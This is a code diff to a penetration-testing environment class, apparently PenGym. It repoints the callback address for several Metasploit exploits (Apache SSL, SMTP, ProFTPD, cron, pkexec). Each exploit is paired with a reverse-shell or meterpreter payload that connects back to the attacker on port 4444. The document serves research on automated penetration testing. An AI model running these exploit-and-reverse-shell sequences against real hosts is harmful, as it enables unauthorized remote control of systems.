@@ -949,7 +949,7 @@ class PenGymHostVector(HostVector):
         exploit_apache[storyboard.SSL_MODULE_ARG] = False
 
         payload = msfrpc.modules.use('payload', 'linux/x64/shell/reverse_tcp')
-        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
+        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
 
         result = exploit_apache.execute(payload=payload)
 
@@ -1025,7 +1025,7 @@ class PenGymHostVector(HostVector):
         exploit_smtp[storyboard.CONNECT_TIMEOUT] = 50
 
         payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_netcat')
-        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
+        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
         payload[storyboard.LPORT] = 4444 # Default value in Metasploit
 
         result = exploit_smtp.execute(payload=payload)
@@ -1142,7 +1142,7 @@ class PenGymHostVector(HostVector):
             pe_proftpd[storyboard.RPORT] = 2121
 
             payload = msfrpc.modules.use('payload', 'cmd/unix/reverse')
-            payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
+            payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
             payload[storyboard.LPORT] = 4444
 
             result = pe_proftpd.execute(payload=payload)
@@ -1201,7 +1201,7 @@ class PenGymHostVector(HostVector):
         exploit_cron[storyboard.WFSDElAY] = 65
 
         payload = msfrpc.modules.use('payload', 'cmd/unix/reverse_python')
-        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
+        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
 
         result = exploit_cron.execute(payload=payload)
         job_id = self.parse_exploit_result(result)
@@ -1252,7 +1252,7 @@ class PenGymHostVector(HostVector):
         exploit_pkexec[storyboard.FORCE_EXPLOIT] = True
 
         payload = msfrpc.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
-        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
+        payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_MGMT_ADDR]
         payload[storyboard.LPORT] = 4444
 
         result = exploit_pkexec.execute(payload=payload)
